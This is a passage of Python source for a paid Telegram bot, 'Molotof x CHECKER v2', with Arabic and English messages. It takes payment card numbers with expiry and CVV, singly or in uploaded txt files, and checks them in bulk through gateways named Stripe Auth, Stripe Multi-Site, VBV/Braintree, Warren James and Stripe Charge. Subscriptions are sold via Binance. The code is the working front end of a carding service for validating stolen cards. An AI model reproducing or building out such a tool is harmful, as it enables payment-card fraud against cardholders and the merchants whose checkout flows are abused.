        bot.reply_to(message, "❌ " + ("يرجى الرد على ملف txt فقط" if user_language.get(user_id, "ar") == "ar" else "Please reply to a txt file only"))
        return
    
    msg = bot.reply_to(message, get_text(user_id, "split_start"))
    
    try:
        file_info = bot.get_file(file.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        filename = f"temp_{user_id}_{int(time.time())}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
        
        parts, total_lines = split_txt_file(filename)
        
        bot.delete_message(chat_id=message.chat.id, message_id=msg.message_id)
        
        for i, part_file in enumerate(parts, 1):
            with open(part_file, 'rb') as f:
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"📂 جزء {i}/{len(parts)} | {total_lines} سطر",
                    visible_file_name=f"part_{i}.txt"
                )
            os.remove(part_file)
        
        os.remove(filename)
        bot.send_message(message.chat.id, get_text(user_id, "split_done", count=len(parts)))
        
    except Exception as e:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=get_text(user_id, "split_error", error=str(e))
        )

# ======================================================
# ===== أوامر الاشتراكات =====
# ======================================================

@bot.message_handler(commands=["sub", "اشتراك"])
def subscription_command(message):
    user_id = str(message.from_user.id)
    sub = subscription_manager.get_subscription(user_id)
    
    if sub:
        expiry = datetime.fromisoformat(sub)
        remaining = expiry - datetime.now()
        days = remaining.days
        hours = remaining.seconds // 3600
        text = get_text(user_id, "sub_active", expiry=expiry.strftime('%Y-%m-%d %H:%M'), days=days, hours=hours)
    else:
        text = get_text(user_id, "sub_plans", binance=BINANCE_ID, owner=OWNER_USERNAME)
    
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=["confirm"])
def confirm_subscription(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, get_text(str(message.from_user.id), "admin_only"))
        return
    
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(
            message,
            get_text(str(message.from_user.id), "confirm_usage")
        )
        return
    
    target_user = args[1].strip()
    plan = args[2].strip().lower()
    
    days_map = {"daily": 1, "weekly": 7, "monthly": 30}
    
    if plan not in days_map:
        bot.reply_to(message, get_text(str(message.from_user.id), "confirm_invalid"))
        return
    
    days = days_map[plan]
    expiry = subscription_manager.add_subscription(target_user, days)
    
    bot.reply_to(
        message,
        get_text(str(message.from_user.id), "confirm_done", user=target_user, plan=plan, expiry=expiry.strftime('%Y-%m-%d %H:%M'))
    )
    
    try:
        bot.send_message(
            target_user,
            get_text(target_user, "confirm_user", plan=plan, expiry=expiry.strftime('%Y-%m-%d %H:%M')),
            parse_mode="HTML"
        )
    except:
        pass

@bot.message_handler(commands=["help", "الاوامر"])
def handle_help(message):
    user_id = str(message.from_user.id)
    bot.reply_to(
        message,
        get_text(user_id, "help_text", binance=BINANCE_ID, owner=OWNER_USERNAME),
        parse_mode="HTML"
    )

# ======================================================
# ===== أوامر Stripe 1 =====
# ======================================================

@bot.message_handler(commands=["st"])
def handle_st_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ أرسل البطاقة بهذه الصيغة:\n<code>/st number|month|year|cvv</code>\nمثال:\n<code>/st 4111111111111111|12|26|123</code>", parse_mode="HTML")
        return
    
    card_str = args[1]
    parts = card_str.split('|')
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ صيغة غير صحيحة. استخدم: number|month|year|cvv", parse_mode="HTML")
        return
    
    num, mon, year, cvc = parts
    num = num.replace(' ', '')
    mon = mon.zfill(2)
    if len(year) == 4 and year.startswith('20'):
        year2 = year[2:]
    else:
        year2 = year[-2:]
    
    wait_msg = bot.reply_to(message, "⏳ جاري الفحص عبر Stripe Auth...")
    
    try:
        result = scan_single_card_stripe(num, mon, year2, cvc)
        bot.edit_message_text(result, chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")

@bot.message_handler(commands=["nst"])
def handle_nst_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "⚠️ Send a txt file first, then reply with /nst")
        return
    
    doc = message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        bot.reply_to(message, "⚠️ File must be .txt")
        return
    
    if user_id in scanning_sessions and scanning_sessions[user_id].get('active', False):
        bot.reply_to(message, "⚠️ Scan already running. Use /stopst to stop it.")
        return
    
    wait_msg = bot.reply_to(message, "⏳ Downloading file...")
    
    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        filename = f"scan_{user_id}_{int(time.time())}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
        
        bot.edit_message_text(f"✅ Downloaded {doc.file_name}\n⏳ Scanning cards...", chat_id=message.chat.id, message_id=wait_msg.message_id)
        
        threading.Thread(target=scan_file_background_stripe, args=(message, filename, doc.file_name, user_id), daemon=True).start()
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", chat_id=message.chat.id, message_id=wait_msg.message_id)

@bot.message_handler(commands=["stopst"])
def handle_stop_st_command(message):
    user_id = str(message.from_user.id)
    
    if user_id not in scanning_sessions or not scanning_sessions[user_id].get('active', False):
        bot.reply_to(message, "ℹ️ No active scan.")
        return
    
    scanning_sessions[user_id]['stop'] = True
    bot.reply_to(message, "⏹ Stopping Stripe scan... Will stop after current card.")

# ======================================================
# ===== أوامر Stripe 2 (متعددة المواقع) =====
# ======================================================

@bot.message_handler(commands=["st2"])
def handle_st2_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ أرسل البطاقة بهذه الصيغة:\n<code>/st2 number|month|year|cvv</code>\nمثال:\n<code>/st2 4111111111111111|12|26|123</code>", parse_mode="HTML")
        return
    
    card_str = args[1]
    parts = card_str.split('|')
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ صيغة غير صحيحة. استخدم: number|month|year|cvv", parse_mode="HTML")
        return
    
    num, mon, year, cvc = parts
    num = num.replace(' ', '')
    mon = mon.zfill(2)
    if len(year) == 4 and year.startswith('20'):
        year2 = year[2:]
    else:
        year2 = year[-2:]
    
    wait_msg = bot.reply_to(message, "⏳ جاري الفحص عبر Stripe Multi-Site...")
    
    try:
        result = scan_single_card_stripe2(num, mon, year2, cvc)
        bot.edit_message_text(result, chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")

@bot.message_handler(commands=["nst2"])
def handle_nst2_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "⚠️ Send a txt file first, then reply with /nst2")
        return
    
    doc = message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        bot.reply_to(message, "⚠️ File must be .txt")
        return
    
    if user_id in stripe2_sessions and stripe2_sessions[user_id].get('active', False):
        bot.reply_to(message, "⚠️ Scan already running. Use /stopst2 to stop it.")
        return
    
    wait_msg = bot.reply_to(message, "⏳ Downloading file...")
    
    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        filename = f"stripe2_scan_{user_id}_{int(time.time())}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
        
        bot.edit_message_text(f"✅ Downloaded {doc.file_name}\n⏳ Scanning cards via Stripe Multi-Site...", chat_id=message.chat.id, message_id=wait_msg.message_id)
        
        threading.Thread(target=scan_file_background_stripe2, args=(message, filename, doc.file_name, user_id), daemon=True).start()
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", chat_id=message.chat.id, message_id=wait_msg.message_id)

@bot.message_handler(commands=["stopst2"])
def handle_stop_st2_command(message):
    user_id = str(message.from_user.id)
    
    if user_id not in stripe2_sessions or not stripe2_sessions[user_id].get('active', False):
        bot.reply_to(message, "ℹ️ No active scan.")
        return
    
    stripe2_sessions[user_id]['stop'] = True
    bot.reply_to(message, "⏹ Stopping Stripe Multi-Site scan... Will stop after current card.")

# ======================================================
# ===== أوامر VBV 1 =====
# ======================================================

@bot.message_handler(commands=["vbv"])
def handle_vbv_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ أرسل البطاقة بهذه الصيغة:\n<code>/vbv number|month|year|cvv</code>\nمثال:\n<code>/vbv 4555734017486848|09|30|286</code>", parse_mode="HTML")
        return
    
    card_str = args[1]
    parts = card_str.split('|')
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ صيغة غير صحيحة. استخدم: number|month|year|cvv", parse_mode="HTML")
        return
    
    num, mon, year, cvc = parts
    num = num.replace(' ', '')
    mon = mon.zfill(2)
    if len(year) == 4 and year.startswith('20'):
        year2 = year[2:]
    else:
        year2 = year[-2:]
    
    wait_msg = bot.reply_to(message, "⏳ جاري الفحص عبر VBV (Braintree)...")
    
    try:
        start_time = time.time()
        result_status, result_data = check_vbv(num, mon, year2, cvc)
        elapsed = round(time.time() - start_time, 2)
        
        result = format_vbv_result(result_status, result_data, num, mon, f"20{year2}", cvc, elapsed)
        bot.edit_message_text(result, chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")

@bot.message_handler(commands=["nvbv"])
def handle_nvbv_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "⚠️ Send a txt file first, then reply with /nvbv")
        return
    
    doc = message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        bot.reply_to(message, "⚠️ File must be .txt")
        return
    
    if user_id in vbv_scanning_sessions and vbv_scanning_sessions[user_id].get('active', False):
        bot.reply_to(message, "⚠️ VBV scan already running. Use /stopvbv to stop it.")
        return
    
    wait_msg = bot.reply_to(message, "⏳ Downloading file...")
    
    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        filename = f"vbv_scan_{user_id}_{int(time.time())}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
        
        bot.edit_message_text(f"✅ Downloaded {doc.file_name}\n⏳ Scanning cards via VBV...", chat_id=message.chat.id, message_id=wait_msg.message_id)
        
        threading.Thread(target=scan_vbv_file_background, args=(message, filename, doc.file_name, user_id), daemon=True).start()
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", chat_id=message.chat.id, message_id=wait_msg.message_id)

@bot.message_handler(commands=["stopvbv"])
def handle_stop_vbv_command(message):
    user_id = str(message.from_user.id)
    
    if user_id not in vbv_scanning_sessions or not vbv_scanning_sessions[user_id].get('active', False):
        bot.reply_to(message, "ℹ️ No active VBV scan.")
        return
    
    vbv_scanning_sessions[user_id]['stop'] = True
    bot.reply_to(message, "⏹ Stopping VBV scan... Will stop after current card.")

# ======================================================
# ===== أوامر VBV V2 (Warren James) =====
# ======================================================

@bot.message_handler(commands=["vbv2"])
def handle_vbv2_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ أرسل البطاقة بهذه الصيغة:\n<code>/vbv2 number|month|year|cvv</code>\nمثال:\n<code>/vbv2 4555734017486848|09|30|286</code>", parse_mode="HTML")
        return
    
    card_str = args[1]
    parts = card_str.split('|')
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ صيغة غير صحيحة. استخدم: number|month|year|cvv", parse_mode="HTML")
        return
    
    num, mon, year, cvc = parts
    num = num.replace(' ', '')
    mon = mon.zfill(2)
    if len(year) == 4 and year.startswith('20'):
        year2 = year[2:]
    else:
        year2 = year[-2:]
    
    wait_msg = bot.reply_to(message, "⏳ جاري الفحص عبر VBV V2 (Warren James)...")
    
    try:
        start_time = time.time()
        result_status, result_data = check_vbv2(num, mon, year2, cvc)
        elapsed = round(time.time() - start_time, 2)
        
        result = format_vbv2_result(result_status, result_data, num, mon, f"20{year2}", cvc, elapsed)
        bot.edit_message_text(result, chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")

@bot.message_handler(commands=["nvbv2"])
def handle_nvbv2_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "⚠️ Send a txt file first, then reply with /nvbv2")
        return
    
    doc = message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        bot.reply_to(message, "⚠️ File must be .txt")
        return
    
    if user_id in vbv2_sessions and vbv2_sessions[user_id].get('active', False):
        bot.reply_to(message, "⚠️ VBV V2 scan already running. Use /stopvbv2 to stop it.")
        return
    
    wait_msg = bot.reply_to(message, "⏳ Downloading file...")
    
    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        filename = f"vbv2_scan_{user_id}_{int(time.time())}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
        
        bot.edit_message_text(f"✅ Downloaded {doc.file_name}\n⏳ Scanning cards via VBV V2 (Warren James)...", chat_id=message.chat.id, message_id=wait_msg.message_id)
        
        threading.Thread(target=scan_vbv2_file_background, args=(message, filename, doc.file_name, user_id), daemon=True).start()
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", chat_id=message.chat.id, message_id=wait_msg.message_id)

@bot.message_handler(commands=["stopvbv2"])
def handle_stop_vbv2_command(message):
    user_id = str(message.from_user.id)
    
    if user_id not in vbv2_sessions or not vbv2_sessions[user_id].get('active', False):
        bot.reply_to(message, "ℹ️ No active VBV V2 scan.")
        return
    
    vbv2_sessions[user_id]['stop'] = True
    bot.reply_to(message, "⏹ Stopping VBV V2 scan... Will stop after current card.")

# ======================================================
# ===== أوامر Stripe Charge (ppool) =====
# ======================================================

@bot.message_handler(commands=["sc"])
def handle_sc_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ أرسل البطاقة بهذه الصيغة:\n<code>/sc number|month|year|cvv</code>\nمثال:\n<code>/sc 4111111111111111|12|26|123</code>", parse_mode="HTML")
        return
    
    card_str = args[1]
    parts = card_str.split('|')
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ صيغة غير صحيحة. استخدم: number|month|year|cvv", parse_mode="HTML")
        return
    
    num, mon, year, cvc = parts
    num = num.replace(' ', '')
    mon = mon.zfill(2)
    if len(year) == 4 and year.startswith('20'):
        year2 = year[2:]
    else:
        year2 = year[-2:]
    
    wait_msg = bot.reply_to(message, "⏳ جاري الفحص عبر Stripe Charge (ppool)...")
    
    try:
        result = scan_single_card_sc(num, mon, year2, cvc)
        bot.edit_message_text(result, chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")

@bot.message_handler(commands=["nsc"])
def handle_nsc_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "⚠️ Send a txt file first, then reply with /nsc")
        return
    
    doc = message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        bot.reply_to(message, "⚠️ File must be .txt")
        return
    
    if user_id in sc_sessions and sc_sessions[user_id].get('active', False):
        bot.reply_to(message, "⚠️ Scan already running. Use /stopsc to stop it.")
        return
    
    wait_msg = bot.reply_to(message, "⏳ Downloading file...")
    
    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        filename = f"sc_scan_{user_id}_{int(time.time())}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
        
        bot.edit_message_text(f"✅ Downloaded {doc.file_name}\n⏳ Scanning cards via Stripe Charge...", chat_id=message.chat.id, message_id=wait_msg.message_id)
        
        threading.Thread(target=scan_sc_file_background, args=(message, filename, doc.file_name, user_id), daemon=True).start()
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", chat_id=message.chat.id, message_id=wait_msg.message_id)

@bot.message_handler(commands=["stopsc"])
def handle_stop_sc_command(message):
    user_id = str(message.from_user.id)
    
    if user_id not in sc_sessions or not sc_sessions[user_id].get('active', False):
        bot.reply_to(message, "ℹ️ No active scan.")
        return
    
    sc_sessions[user_id]['stop'] = True
    bot.reply_to(message, "⏹ Stopping Stripe Charge scan... Will stop after current card.")

# ======================================================
# ===== أوامر معطلة للتوافق =====
# ======================================================

@bot.message_handler(func=lambda message: message.text.lower().startswith('.pp') or message.text.lower().startswith('/pp'))
def my_ali4(message):
    user_id = str(message.from_user.id)
    bot.reply_to(message, "❌ هذه البوابة غير متوفرة حالياً.\nاستخدم /st للفحص عبر Stripe أو /vbv للفحص عبر VBV", parse_mode="HTML")

@bot.message_handler(commands=["npp"])
def handle_npp_command(message):
    user_id = str(message.from_user.id)
    bot.reply_to(message, "❌ هذه البوابة غير متوفرة حالياً.\nاستخدم /nst للفحص عبر Stripe أو /nvbv للفحص عبر VBV", parse_mode="HTML")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    pass

# ======================================================
# ===== تشغيل البوت =====
# ======================================================

def run_bot():
    while True:
        try:
            print('-' * 50)
            print('🔥 Molotof x CHECKER v2 - Multi Language')
            print('🔥 Gateways: Stripe Auth + Stripe Multi-Site + VBV + VBV V2 + Stripe Charge')
            print('🔥 Subscriptions: Daily 3$, Weekly 15$, Monthly 35$')
            print('🔥 Owner: @{}'.format(OWNER_USERNAME))
            print('🔥 Commands:')
            print('  🔍 /st, /nst, /stopst - Stripe Auth')
            print('  🔍 /st2, /nst2, /stopst2 - Stripe Multi-Site')
            print('  🔍 /vbv, /nvbv, /stopvbv - VBV')
            print('  🔍 /vbv2, /nvbv2, /stopvbv2 - VBV V2 (Warren James)')
            print('  🔍 /sc, /nsc, /stopsc - Stripe Charge (ppool)')
            print('  ⚡ /gen, /bin, /clean, /kw')
            print('  💎 /sub, /confirm, /help')
            print('🔥 Bot started...')
            print('-' * 50)
            
            bot.infinity_polling(none_stop=True, interval=0, timeout=20)
            
        except (requests.exceptions.ConnectionError, 
                requests.exceptions.ReadTimeout,
                urllib3.exceptions.ProtocolError,
                socket.error,
                http.client.RemoteDisconnected) as e:
            
            print(f'⚠️ Connection error: {e}')
            print('🔄 Retrying in 10 seconds...')
            time.sleep(10)
            continue
            
        except Exception as e:
            print(f'❌ Error: {e}')
            print('🔄 Restarting in 30 seconds...')
            time.sleep(30)
            continue

if __name__ == '__main__':
    run_bot()